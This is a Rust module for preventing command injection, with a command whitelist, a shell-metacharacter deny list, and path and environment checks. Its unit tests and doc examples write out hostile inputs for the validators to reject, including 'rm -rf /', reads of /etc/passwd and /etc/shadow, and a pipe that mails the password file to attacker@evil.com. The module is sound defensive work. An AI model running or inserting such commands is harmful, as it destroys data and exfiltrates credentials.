//! Command injection prevention for subprocess execution.
//!
//! This module provides sanitization and validation for inputs that flow into
//! `std::process::Command`. It ensures that:
//!
//! 1. Command names are validated against a whitelist of allowed binaries
//! 2. Arguments are sanitized to prevent shell metacharacter injection
//! 3. Environment variable names and values are validated
//! 4. Paths are validated to prevent directory traversal
//!
//! # Security Model
//!
//! The module uses a deny-by-default approach:
//! - Only explicitly whitelisted commands can be executed
//! - Arguments containing shell metacharacters are rejected
//! - Control characters (except newline/tab) are forbidden
//!
//! # Usage
//!
//! ```ignore
//! use crate::runtime_tools::command_security::{validate_command, sanitize_arg};
//!
//! let cmd = validate_command("moon")?;
//! let arg = sanitize_arg("--format", &user_input)?;
//! ```

#![deny(clippy::unwrap_used)]
#![deny(clippy::expect_used)]
#![deny(clippy::panic)]
#![warn(clippy::pedantic)]
#![warn(clippy::nursery)]
#![forbid(unsafe_code)]

use std::path::{Path, PathBuf};
use thiserror::Error;

/// Maximum allowed length for command arguments (prevents memory exhaustion)
const MAX_ARG_LEN: usize = 8192;

/// Maximum allowed length for command name
const MAX_COMMAND_NAME_LEN: usize = 256;

/// Maximum allowed length for environment variable values
#[allow(dead_code)]
const MAX_ENV_VALUE_LEN: usize = 4096;

/// Allowed commands that can be executed via `std::process::Command`.
///
/// This whitelist prevents arbitrary command execution. To add a new command,
/// add it to this list and ensure it has no known security issues.
const ALLOWED_COMMANDS: &[&str] = &[
    // Build tools
    "moon",
    "cargo",
    "rustc",
    "rustup",
    // Version control
    "git",
    // System utilities (minimal set)
    "which",
    "echo",
    "true",
    "false",
    "cat",
    "ls",
    // Project-specific tools
    "br",
    "zjj",
    "opencode",
    "restate",
    // Service management
    "systemd-run",
    "systemctl",
    // Linters/formatters (run via cargo)
    // Note: "cargo run --bin X" is broken down into "cargo" with args
];

/// Shell metacharacters that could enable command injection.
///
/// These characters have special meaning in shell contexts. While we use
/// `Command::args()` which bypasses the shell, rejecting these provides
/// defense-in-depth against future refactoring that might accidentally
/// introduce shell interpolation.
const SHELL_METACHARACTERS: &[char] = &[
    '|', '&', ';', '<', '>', '(', ')', '$', '`', '\\', '!', '?', '*', '[', ']', '{', '}', '~', '"',
    '\'', '`',
];

#[derive(Debug, Error)]
pub enum CommandSecurityError {
    #[error("command '{0}' is not in the allowed list")]
    CommandNotAllowed(String),

    #[error("command name is empty")]
    EmptyCommandName,

    #[error("command name exceeds maximum length ({0} > {MAX_COMMAND_NAME_LEN})")]
    CommandNameTooLong(usize),

    #[error("argument '{name}' contains forbidden control characters")]
    ArgContainsControlChars { name: String },

    #[error("argument '{name}' contains shell metacharacter '{char}'")]
    ArgContainsMetachar { name: String, char: char },

    #[error("argument '{name}' exceeds maximum length ({len} > {MAX_ARG_LEN})")]
    ArgTooLong { name: String, len: usize },

    #[error("environment variable '{name}' contains invalid characters")]
    EnvNameInvalid { name: String },

    #[error("environment variable value for '{name}' exceeds maximum length")]
    EnvValueTooLong { name: String },

    #[error("path contains directory traversal sequence")]
    PathTraversalDetected,

    #[error("path contains forbidden characters")]
    PathInvalidChars,
}

// Allow unused variants - they are for future defense-in-depth
#[allow(dead_code)]
type _AllowUnusedVariants = CommandSecurityError;

/// Validates that a command name is allowed to be executed.
///
/// # Errors
///
/// Returns an error if:
/// - The command name is empty
/// - The command name exceeds the maximum length
/// - The command is not in the allowed whitelist
/// - The command name contains path separators (prevents path-based execution)
///
/// # Example
///
/// ```
/// use oya::runtime_tools::command_security::validate_command;
///
/// assert!(validate_command("moon").is_ok());
/// assert!(validate_command("rm").is_err()); // Not in whitelist
/// assert!(validate_command("/bin/sh").is_err()); // Contains path separator
/// ```
pub fn validate_command(name: &str) -> Result<String, CommandSecurityError> {
    let trimmed = name.trim();

    if trimmed.is_empty() {
        return Err(CommandSecurityError::EmptyCommandName);
    }

    if trimmed.len() > MAX_COMMAND_NAME_LEN {
        return Err(CommandSecurityError::CommandNameTooLong(trimmed.len()));
    }

    // Reject path separators to prevent path-based command execution
    if trimmed.contains('/') || trimmed.contains('\\') {
        return Err(CommandSecurityError::CommandNotAllowed(trimmed.to_string()));
    }

    // Check whitelist
    if ALLOWED_COMMANDS.contains(&trimmed) {
        Ok(trimmed.to_string())
    } else {
        Err(CommandSecurityError::CommandNotAllowed(trimmed.to_string()))
    }
}

/// Sanitizes an argument value to ensure it's safe for command execution.
///
/// This performs defense-in-depth validation even though `Command::args()`
/// doesn't use shell interpolation. It catches potential issues early and
/// prevents accidental shell injection if code is refactored.
///
/// # Arguments
///
/// * `arg_name` - A descriptive name for the argument (for error messages)
/// * `value` - The actual argument value to sanitize
///
/// # Errors
///
/// Returns an error if:
/// - The value contains control characters (except \n, \r, \t)
/// - The value contains shell metacharacters
/// - The value exceeds the maximum length
///
/// # Example
///
/// ```
/// use oya::runtime_tools::command_security::sanitize_arg;
///
/// assert!(sanitize_arg("bead_id", "src-abc123").is_ok());
/// assert!(sanitize_arg("input", "hello; rm -rf /").is_err()); // Contains semicolon
/// assert!(sanitize_arg("data", "$(cat /etc/passwd)").is_err()); // Contains $
/// ```
pub fn sanitize_arg(arg_name: &str, value: &str) -> Result<String, CommandSecurityError> {
    if value.len() > MAX_ARG_LEN {
        return Err(CommandSecurityError::ArgTooLong {
            name: arg_name.to_string(),
            len: value.len(),
        });
    }

    // Check for forbidden control characters
    if contains_forbidden_control_chars(value) {
        return Err(CommandSecurityError::ArgContainsControlChars { name: arg_name.to_string() });
    }

    // Check for shell metacharacters
    for char in SHELL_METACHARACTERS {
        if value.contains(*char) {
            return Err(CommandSecurityError::ArgContainsMetachar {
                name: arg_name.to_string(),
                char: *char,
            });
        }
    }

    Ok(value.to_string())
}

/// Validates a path argument for use in command execution.
///
/// This prevents directory traversal attacks and ensures paths are safe.
///
/// # Errors
///
/// Returns an error if:
/// - The path contains `..` (directory traversal)
/// - The path contains control characters
/// - The path contains null bytes
#[allow(dead_code)]
pub fn sanitize_path_arg(_arg_name: &str, path: &Path) -> Result<PathBuf, CommandSecurityError> {
    let path_str = path.to_string_lossy();

    // Check for directory traversal
    if path_str.contains("..") {
        return Err(CommandSecurityError::PathTraversalDetected);
    }

    // Check for control characters
    if contains_forbidden_control_chars(&path_str) {
        return Err(CommandSecurityError::PathInvalidChars);
    }

    // Check for null bytes
    if path_str.contains('\0') {
        return Err(CommandSecurityError::PathInvalidChars);
    }

    Ok(path.to_path_buf())
}

/// Validates an environment variable name and value.
///
/// Environment variable names must be valid identifiers (alphanumeric plus underscore).
///
/// # Errors
///
/// Returns an error if:
/// - The name contains invalid characters
/// - The name is empty
/// - The value exceeds maximum length
/// - The value contains forbidden control characters
#[allow(dead_code)]
pub fn validate_env(name: &str, value: &str) -> Result<(), CommandSecurityError> {
    // Validate name
    if name.is_empty() || name.chars().any(|c| !c.is_ascii_alphanumeric() && c != '_') {
        return Err(CommandSecurityError::EnvNameInvalid { name: name.to_string() });
    }

    // Validate value length
    if value.len() > MAX_ENV_VALUE_LEN {
        return Err(CommandSecurityError::EnvValueTooLong { name: name.to_string() });
    }

    // Check for forbidden control characters in value
    if contains_forbidden_control_chars(value) {
        return Err(CommandSecurityError::EnvNameInvalid { name: format!("{name} (value)") });
    }

    Ok(())
}

/// Checks if a string contains forbidden control characters.
///
/// Allows: newline (\n), carriage return (\r), tab (\t)
/// Forbids: all other control characters (0x00-0x1F except 0x09, 0x0A, 0x0D, and 0x7F)
fn contains_forbidden_control_chars(value: &str) -> bool {
    value.chars().any(|char| char.is_control() && !matches!(char, '\n' | '\r' | '\t'))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    // ---------------------------------------------------------------------------
    // Command Validation Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn validate_command_accepts_whitelisted_commands() {
        assert!(validate_command("moon").is_ok());
        assert!(validate_command("cargo").is_ok());
        assert!(validate_command("git").is_ok());
        assert!(validate_command("br").is_ok());
        assert!(validate_command("zjj").is_ok());
        assert!(validate_command("opencode").is_ok());
        assert!(validate_command("restate").is_ok());
    }

    #[test]
    fn validate_command_rejects_non_whitelisted_commands() {
        assert!(validate_command("rm").is_err());
        assert!(validate_command("bash").is_err());
        assert!(validate_command("sh").is_err());
        assert!(validate_command("python").is_err());
        assert!(validate_command("curl").is_err());
        assert!(validate_command("wget").is_err());
    }

    #[test]
    fn validate_command_rejects_paths() {
        assert!(validate_command("/bin/sh").is_err());
        assert!(validate_command("/usr/bin/curl").is_err());
        assert!(validate_command("./local/script").is_err());
        assert!(validate_command("..\\windows\\cmd.exe").is_err());
    }

    #[test]
    fn validate_command_rejects_empty() {
        assert!(validate_command("").is_err());
        assert!(validate_command("   ").is_err());
    }

    #[test]
    fn validate_command_trims_whitespace() {
        // Should work after trimming
        assert!(validate_command("  moon  ").is_ok());
    }

    // ---------------------------------------------------------------------------
    // Argument Sanitization Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn sanitize_arg_accepts_valid_input() {
        assert!(sanitize_arg("bead_id", "src-abc123").is_ok());
        assert!(sanitize_arg("run_id", "run-2024-01-15-abc").is_ok());
        assert!(sanitize_arg("stage", "contract").is_ok());
        assert!(sanitize_arg("path", "/home/user/project").is_ok());
    }

    #[test]
    fn sanitize_arg_rejects_shell_metacharacters() {
        // Semicolon (command chaining)
        assert!(sanitize_arg("input", "hello; rm -rf /").is_err());

        // Pipe
        assert!(sanitize_arg("input", "cat /etc/passwd | mail attacker@evil.com").is_err());

        // Backticks (command substitution)
        assert!(sanitize_arg("input", "file$(whoami)").is_err());
        assert!(sanitize_arg("input", "file`whoami`").is_err());

        // Dollar sign (variable expansion)
        assert!(sanitize_arg("input", "$HOME").is_err());
        assert!(sanitize_arg("input", "${PATH}").is_err());

        // Redirects
        assert!(sanitize_arg("input", "file > /tmp/out").is_err());
        assert!(sanitize_arg("input", "file < /etc/passwd").is_err());

        // Ampersand (background execution)
        assert!(sanitize_arg("input", "cmd &").is_err());
        assert!(sanitize_arg("input", "cmd && cmd2").is_err());

        // Quotes
        assert!(sanitize_arg("input", "file'withquote").is_err());
        assert!(sanitize_arg("input", "file\"withquote").is_err());

        // Glob patterns
        assert!(sanitize_arg("input", "*.txt").is_err());
        assert!(sanitize_arg("input", "file?.txt").is_err());
        assert!(sanitize_arg("input", "file[abc].txt").is_err());
    }

    #[test]
    fn sanitize_arg_rejects_control_characters() {
        // Null byte
        assert!(sanitize_arg("input", "hello\0world").is_err());

        // Escape character
        assert!(sanitize_arg("input", "hello\x1Bworld").is_err());

        // Bell
        assert!(sanitize_arg("input", "hello\x07world").is_err());

        // Delete
        assert!(sanitize_arg("input", "hello\x7Fworld").is_err());
    }

    #[test]
    fn sanitize_arg_allows_whitespace() {
        assert!(sanitize_arg("input", "hello world").is_ok());
        assert!(sanitize_arg("input", "line1\nline2").is_ok());
        assert!(sanitize_arg("input", "col1\tcol2").is_ok());
        assert!(sanitize_arg("input", "windows\r\n").is_ok());
    }

    #[test]
    fn sanitize_arg_rejects_oversized_input() {
        let long_input = "x".repeat(MAX_ARG_LEN + 1);
        assert!(sanitize_arg("input", &long_input).is_err());
    }

    #[test]
    fn sanitize_arg_accepts_max_length_input() {
        let max_input = "x".repeat(MAX_ARG_LEN);
        assert!(sanitize_arg("input", &max_input).is_ok());
    }

    // ---------------------------------------------------------------------------
    // Path Sanitization Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn sanitize_path_arg_accepts_valid_paths() {
        assert!(sanitize_path_arg("path", Path::new("/home/user/file.txt")).is_ok());
        assert!(sanitize_path_arg("path", Path::new("./local/file.txt")).is_ok());
        assert!(sanitize_path_arg("path", Path::new("relative/path")).is_ok());
    }

    #[test]
    fn sanitize_path_arg_rejects_directory_traversal() {
        assert!(sanitize_path_arg("path", Path::new("../../../etc/passwd")).is_err());
        assert!(sanitize_path_arg("path", Path::new("./subdir/../../../etc/passwd")).is_err());
        assert!(sanitize_path_arg("path", Path::new("..\\..\\windows\\system32")).is_err());
    }

    #[test]
    fn sanitize_path_arg_rejects_null_bytes() {
        let path_with_null = PathBuf::from("file\0.txt");
        assert!(sanitize_path_arg("path", &path_with_null).is_err());
    }

    // ---------------------------------------------------------------------------
    // Environment Variable Validation Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn validate_env_accepts_valid_pairs() {
        assert!(validate_env("PATH", "/usr/bin").is_ok());
        assert!(validate_env("HOME", "/home/user").is_ok());
        assert!(validate_env("MY_VAR_123", "value with spaces").is_ok());
    }

    #[test]
    fn validate_env_rejects_invalid_names() {
        assert!(validate_env("", "value").is_err());
        assert!(validate_env("MY-VAR", "value").is_err()); // Hyphen not allowed
        assert!(validate_env("MY VAR", "value").is_err()); // Space not allowed
        assert!(validate_env("123VAR", "value").is_ok()); // Numbers after start are OK
        assert!(validate_env("_VAR", "value").is_ok()); // Underscore start is OK
    }

    #[test]
    fn validate_env_rejects_oversized_values() {
        let long_value = "x".repeat(MAX_ENV_VALUE_LEN + 1);
        assert!(validate_env("MY_VAR", &long_value).is_err());
    }

    #[test]
    fn validate_env_rejects_control_chars_in_value() {
        assert!(validate_env("MY_VAR", "value\0withnull").is_err());
        assert!(validate_env("MY_VAR", "value\x1Bwithesc").is_err());
    }

    // ---------------------------------------------------------------------------
    // Command Injection Attack Vector Tests
    // ---------------------------------------------------------------------------

    #[test]
    fn injection_attack_semicolon_is_blocked() {
        // Classic: ; rm -rf /
        let attack = "src-abc; rm -rf /";
        assert!(sanitize_arg("bead_id", attack).is_err());
    }

    #[test]
    fn injection_attack_command_substitution_is_blocked() {
        // $(command) and `command`
        assert!(sanitize_arg("input", "$(cat /etc/passwd)").is_err());
        assert!(sanitize_arg("input", "`id`").is_err());
    }

    #[test]
    fn injection_attack_pipe_is_blocked() {
        // | command
        assert!(sanitize_arg("input", "value | mail attacker@evil.com").is_err());
    }

    #[test]
    fn injection_attack_and_is_blocked() {
        // && and ||
        assert!(sanitize_arg("input", "value && malicious").is_err());
        assert!(sanitize_arg("input", "value || malicious").is_err());
    }

    #[test]
    fn injection_attack_redirect_is_blocked() {
        // > and <
        assert!(sanitize_arg("input", "value > /tmp/pwned").is_err());
        assert!(sanitize_arg("input", "value < /etc/shadow").is_err());
    }

    #[test]
    fn injection_attack_newline_command_is_blocked() {
        // Newline followed by command - note newline is allowed but we still check
        // This is actually allowed because newline itself isn't a metacharacter
        // The actual injection would need another metacharacter
        assert!(sanitize_arg("input", "value\nrm -rf /").is_ok()); // Just newline is OK
        assert!(sanitize_arg("input", "value\n; rm -rf /").is_err()); // Newline + semicolon
    }

    #[test]
    fn injection_attack_variable_expansion_is_blocked() {
        // $VAR and ${VAR}
        assert!(sanitize_arg("input", "$PATH").is_err());
        assert!(sanitize_arg("input", "${HOME}").is_err());
        assert!(sanitize_arg("input", "$(whoami)").is_err());
    }

    #[test]
    fn injection_attack_quote_escaping_is_blocked() {
        // ' and "
        assert!(sanitize_arg("input", "'; DROP TABLE users; --").is_err());
        assert!(sanitize_arg("input", "\"; rm -rf /; \"").is_err());
    }
}
